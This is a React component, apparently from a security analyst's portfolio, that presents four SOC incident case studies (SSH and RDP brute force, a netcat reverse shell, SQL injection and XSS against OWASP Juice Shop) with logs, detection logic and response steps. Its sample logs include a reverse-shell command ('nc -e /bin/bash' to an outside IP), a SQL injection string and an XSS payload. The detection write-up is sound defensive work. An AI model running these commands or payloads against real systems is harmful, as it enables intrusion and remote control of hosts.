import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ShieldAlert, Terminal, FileWarning, Globe, Shield } from 'lucide-react';
import TerminalLog from './TerminalLog';

export default function SocCaseStudies() {
  const [activeCase, setActiveCase] = useState(0);

  const cases = [
    {
      id: "IR-2024-001",
      title: "SSH Brute Force & Persistence",
      icon: <Terminal className="w-5 h-5" />,
      type: "Credential Access & Persistence",
      severity: "HIGH",
      mitre: "T1110 (Brute Force), T1053 (Scheduled Task/Job)",
      summary: "Detected repeated SSH authentication failures followed by a successful login and immediate creation of a hidden cron job for persistence.",
      logs: [
        { time: "02:14:05", type: "warning", message: "sshd: Failed password for invalid user admin from 192.168.1.105 port 54322 ssh2" },
        { time: "02:14:08", type: "warning", message: "sshd: Failed password for root from 192.168.1.105 port 54324 ssh2" },
        { time: "02:15:12", type: "error", message: "[ALERT] Rule 5710: Attempt to login using a non-existent user" },
        { time: "02:18:45", type: "success", message: "sshd: Accepted password for root from 192.168.1.105 port 54401 ssh2" },
        { time: "02:19:10", type: "info", message: "Sysmon EventID 1: Process create: /usr/bin/crontab -e" },
        { time: "02:20:00", type: "error", message: "[ALERT] Persistence: Suspicious Cron Job Creation Detected" }
      ],
      logic: "Wazuh Rule 5710 triggered due to multiple failed SSH attempts matching the regex pattern for non-existent users within a 60-second window. The secondary alert triggered when Sysmon EventID 1 caught the `crontab -e` command immediately following the successful login from the same suspicious IP.",
      reasoning: "The rapid succession of failed logins followed by a successful one indicates a successful brute force. The immediate interaction with the crontab suggests automated script behavior attempting to establish persistence via a reverse shell payload.",
      investigation: [
        "Identified source IP 192.168.1.105 as a compromised internal host.",
        "Correlated SSH authentication logs with Sysmon execution logs on the target server.",
        "Discovered a reverse bash shell payload added to root's crontab."
      ],
      response: [
        "Isolated the compromised internal host from the network via switch port shutdown.",
        "Terminated the active SSH session and purged the malicious cron job.",
        "Reset root credentials and deployed a strict fail2ban rule for SSH throttling."
      ]
    },
    {
      id: "IR-2024-002",
      title: "RDP Brute Force Attempt",
      icon: <ShieldAlert className="w-5 h-5" />,
      type: "Credential Access",
      severity: "MEDIUM",
      mitre: "T1110.001 (Password Guessing)",
      summary: "Detected an automated RDP brute force campaign targeting a jump server. The attack triggered Wazuh alerts and was mitigated automatically.",
      logs: [
        { time: "09:12:01", type: "warning", message: "Security ID 4625: An account failed to log on (Logon Type 3)" },
        { time: "09:12:15", type: "warning", message: "Security ID 4625: An account failed to log on (TargetUserName: Administrator)" },
        { time: "09:13:00", type: "error", message: "[ALERT] Rule 60122: Multiple Windows Logon Failures" },
        { time: "09:13:45", type: "info", message: "Wazuh Active Response: Firewall-drop on IP 203.0.113.45" }
      ],
      logic: "Windows Event ID 4625 (Failed Logon) fired 15+ times within 2 minutes. Wazuh correlated these events and tripped Rule 60122, invoking an Active Response script.",
      reasoning: "The uniform time intervals (exactly 14 seconds apart) between failed attempts strongly point to an automated tool (e.g., Hydra or Crowbar). Active response correctly dropped the connection before success.",
      investigation: [
        "Reviewed Windows Security Event ID 4625 logs in Wazuh Dashboard.",
        "Confirmed uniform interval between failed attempts indicating automated tooling.",
        "Verified Active Response script successfully added the IP to the local Windows Firewall blocklist."
      ],
      response: [
        "Confirmed the attacker IP was automatically blocked by Wazuh Active Response.",
        "Added the malicious IP to the perimeter firewall blacklist.",
        "Enforced MFA for all external RDP connections to the jump server."
      ]
    },
    {
      id: "IR-2024-003",
      title: "Reverse Shell via Netcat",
      icon: <Terminal className="w-5 h-5" />,
      type: "Execution / Command and Control",
      severity: "CRITICAL",
      mitre: "T1059.004 (Unix Shell), T1090 (Proxy)",
      summary: "Detected an outbound connection established via Netcat (nc) spawning an interactive bash shell to an external C2 IP.",
      logs: [
        { time: "11:05:22", type: "info", message: "Sysmon EventID 1: Process create: nc -e /bin/bash 198.51.100.22 4444" },
        { time: "11:05:24", type: "warning", message: "Sysmon EventID 3: Network connection detected: nc -> 198.51.100.22:4444" },
        { time: "11:05:30", type: "error", message: "[ALERT] Rule 10001: Suspicious outbound shell connection" },
        { time: "11:06:05", type: "info", message: "Sysmon EventID 1: Process create: whoami" }
      ],
      logic: "Sysmon Event ID 1 caught the `nc` executable being called with the `-e /bin/bash` flag, a known signature for a reverse shell. Event ID 3 confirmed the network connection to port 4444, a common default C2 port.",
      reasoning: "The web server process (www-data) spawning a netcat process means the application was exploited (likely RCE). The subsequent `whoami` command confirms the attacker achieved interactive command execution.",
      investigation: [
        "Analyzed Sysmon Event ID 1 & 3 to identify the exact command line and destination IP.",
        "Traced the parent process back to a vulnerable PHP web application worker.",
        "Verified command execution (whoami, id) post-connection to assess lateral movement."
      ],
      response: [
        "Immediately killed the netcat process and isolated the web server container.",
        "Blocked the external C2 IP (198.51.100.22) at the core firewall.",
        "Initiated full disk scan to hunt for dropped webshells or secondary payloads."
      ]
    },
    {
      id: "IR-2024-004",
      title: "Web Attack (OWASP Juice Shop)",
      icon: <Globe className="w-5 h-5" />,
      type: "Initial Access / Web Application",
      severity: "HIGH",
      mitre: "T1190 (Exploit Public-Facing Application)",
      summary: "Detected multiple SQL injection payloads and Cross-Site Scripting (XSS) attempts directed at the Juice Shop instance.",
      logs: [
        { time: "15:40:12", type: "info", message: 'nginx: GET /rest/products/search?q=1%27%20OR%20%271%27=%271 HTTP/1.1" 200' },
        { time: "15:40:15", type: "error", message: "[ALERT] Suricata: ET WEB_SERVER Possible SQL Injection Attempt" },
        { time: "15:45:00", type: "info", message: 'nginx: POST /api/Feedbacks HTTP/1.1" 201 (Payload: <iframe src="javascript:alert(xss)">)' },
        { time: "15:45:02", type: "error", message: "[ALERT] Suricata: ET WEB_CLIENT Possible XSS Payload" }
      ],
      logic: "Suricata NIDS caught the `1' OR '1'='1` string in the URI query parameters matching an Emerging Threats SQLi signature. The subsequent POST request contained an `<iframe>` tag matching an XSS signature.",
      reasoning: "A 200 HTTP response to the SQLi attempt indicates the application may have processed the payload successfully. The 201 response to the XSS payload indicates the malicious script was stored in the database.",
      investigation: [
        "Reviewed Suricata NIDS alerts mapping to the web server traffic.",
        "Analyzed application logs to confirm if the SQLi syntax returned full database contents.",
        "Identified the stored XSS payload in the feedback endpoint."
      ],
      response: [
        "Implemented strict WAF rules to block boolean-based SQLi patterns.",
        "Sanitized feedback inputs on the application side and enforced Content Security Policy (CSP).",
        "Purged malicious XSS payloads from the database."
      ]
    }
  ];

  const active = cases[activeCase];

  return (
    <section id="cases" className="py-20 relative z-10">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.6 }}
          className="mb-12 border-l-2 border-neon-red pl-6"
        >
          <h2 className="text-3xl font-bold text-white tracking-tight uppercase terminal-text">
            SOC Incident <span className="text-neon-red">Case Studies</span>
          </h2>
          <p className="text-gray-400 mt-2 terminal-text text-sm uppercase tracking-widest">
            // Threat Triage & Investigation Reports
          </p>
        </motion.div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          {/* Case Selector */}
          <div className="lg:col-span-4 space-y-4">
            {cases.map((c, idx) => (
              <div 
                key={c.id}
                onClick={() => setActiveCase(idx)}
                className={`cyber-panel p-4 cursor-pointer transition-all duration-300 hover-target ${activeCase === idx ? 'border-neon-red shadow-[0_0_15px_rgba(255,0,60,0.2)]' : 'border-gray-800 opacity-70 hover:opacity-100'}`}
              >
                <div className="flex items-center justify-between mb-2">
                  <span className="text-[10px] terminal-text text-gray-500">{c.id}</span>
                  <span className={`text-[10px] terminal-text px-2 py-0.5 rounded-sm ${c.severity === 'CRITICAL' ? 'bg-red-500/20 text-red-400' : c.severity === 'HIGH' ? 'bg-orange-500/20 text-orange-400' : 'bg-yellow-500/20 text-yellow-400'}`}>
                    {c.severity}
                  </span>
                </div>
                <h3 className="text-white font-bold text-sm mb-1">{c.title}</h3>
                <p className="text-xs text-gray-400">{c.type}</p>
              </div>
            ))}
          </div>

          {/* Case Details */}
          <div className="lg:col-span-8">
            <AnimatePresence mode="wait">
              <motion.div
                key={active.id}
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
                className="cyber-panel p-6 h-full"
              >
                <div className="flex items-center gap-3 mb-6 pb-4 border-b border-gray-800">
                  <div className="p-2 bg-neon-red/10 text-neon-red rounded-sm border border-neon-red/30">
                    <FileWarning className="w-6 h-6" />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white terminal-text">{active.title}</h3>
                    <p className="text-sm text-gray-400">{active.id} | {active.type} | <span className="text-neon-blue">{active.mitre}</span></p>
                  </div>
                </div>

                <div className="mb-6">
                  <h4 className="text-xs terminal-text text-gray-500 uppercase mb-2">Executive Summary</h4>
                  <p className="text-gray-300 text-sm leading-relaxed">{active.summary}</p>
                </div>

                <div className="mb-6">
                  <h4 className="text-xs terminal-text text-gray-500 uppercase mb-2">Telemetry Evidence</h4>
                  <TerminalLog logs={active.logs} title={`/var/log/siem/${active.id.toLowerCase()}.log`} />
                </div>
                
                <div className="mb-6 bg-black/40 p-4 border-l-2 border-neon-blue rounded-sm">
                  <h4 className="text-xs terminal-text text-neon-blue uppercase mb-2">Detection Logic & Reasoning</h4>
                  <p className="text-sm text-gray-300 mb-2"><strong>Logic:</strong> {active.logic}</p>
                  <p className="text-sm text-gray-300"><strong>Analyst Reasoning:</strong> {active.reasoning}</p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h4 className="text-xs terminal-text text-neon-blue uppercase mb-3">&gt; Investigation Steps</h4>
                    <ul className="space-y-2">
                      {active.investigation.map((step, idx) => (
                        <li key={idx} className="text-sm text-gray-300 flex items-start gap-2">
                          <span className="text-neon-blue mt-1">-</span>
                          <span>{step}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                  <div>
                    <h4 className="text-xs terminal-text text-neon-green uppercase mb-3">&gt; Incident Response</h4>
                    <ul className="space-y-2">
                      {active.response.map((step, idx) => (
                        <li key={idx} className="text-sm text-gray-300 flex items-start gap-2">
                          <span className="text-neon-green mt-1">-</span>
                          <span>{step}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
              </motion.div>
            </AnimatePresence>
          </div>
        </div>
      </div>
    </section>
  );
}
